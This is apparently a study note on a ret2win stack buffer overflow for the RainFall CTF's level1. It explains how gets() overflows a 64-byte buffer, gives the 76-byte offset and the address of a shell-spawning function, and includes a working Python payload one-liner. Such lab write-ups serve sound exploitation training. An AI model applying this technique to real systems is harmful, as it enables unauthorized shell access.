# Stack buffer overflow (ret2win)

## Concept
A **stack buffer overflow** allows overwriting data located after the buffer: saved EBP then the **return address**. By placing the address of a target function (e.g. `run` which calls system("/bin/sh")), the `ret` of the vulnerable function jumps to that function instead of returning to the caller.

## Simple definition
- `gets(buffer)` (or unbounded read) fills the buffer then **overflows**.
- The extra bytes overwrite saved EBP (4 bytes) then the **return address** (4 bytes). At `ret`, the CPU loads this address into EIP → we control the flow.

## Where it appears (level1)
- `main`: buffer (64 bytes at esp+0x10), then `gets(buffer)`. No bound → overflow.
- **Offset** to the return address: 76 bytes on RainFall (buffer + padding + saved EBP). The next 4 bytes = new return address.
- Target: function **run** (0x08048444) which calls system("/bin/sh").

## Stack diagram

```
  low addr   +------------------+
             | buffer (64 B)    |  ← gets() fills here
             +------------------+
             | padding / EBP    |
             +------------------+
             | saved EIP (ret)  |  ← we write run's address here
             +------------------+
  high addr
```

## Exploit
- Payload: 76 bytes (padding) + address of `run` in little-endian (`\x44\x84\x04\x08`).
- Invocation: `( python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat ) | ./level1` to keep stdin open.

## Mental summary
Stack overflow → overwrite the return address → at ret we jump to a function in the binary (ret2win). No shellcode.

## References
- `gets(3)` (deprecated, unbounded): https://man7.org/linux/man-pages/man3/gets.3.html
